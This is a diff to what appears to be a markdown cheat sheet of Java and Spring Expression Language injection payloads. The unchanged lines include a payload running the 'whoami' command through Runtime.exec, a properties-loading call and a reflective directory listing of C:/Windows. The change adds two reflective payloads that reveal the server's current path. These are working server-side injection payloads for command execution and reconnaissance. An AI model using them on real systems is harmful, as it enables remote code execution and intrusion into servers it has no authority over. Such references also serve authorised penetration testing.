@@ -30,6 +30,12 @@ T(org.springframework.core.io.support.PropertiesLoaderUtils).loadAllProperties("
 T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream().readAllBytes()
 ```
 
+## Get current path
+```java
+(new java.io.File("./")).getAbsolutePath()
+("".getClass().forName("java.io.File").getConstructor("".getClass())).newInstance("./").getAbsolutePath()
+```
+
 ## Listing files
 ```java
 "".getClass().forName("java.io.File").getConstructor("".getClass()).newInstance("C:/Windows").listFiles()
